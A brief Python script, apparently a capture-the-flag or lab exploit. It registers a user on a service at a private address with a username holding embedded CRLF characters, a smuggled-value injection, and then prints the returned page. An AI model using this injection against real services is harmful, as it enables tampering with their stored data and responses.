import requests

s = requests.Session()

s.post(f"http://10.10.12.10:3002/register", data={ "username": "igor\r\n\r", "password": "aboba" })
res = s.get("http://10.10.12.10:3002")

print(res.text)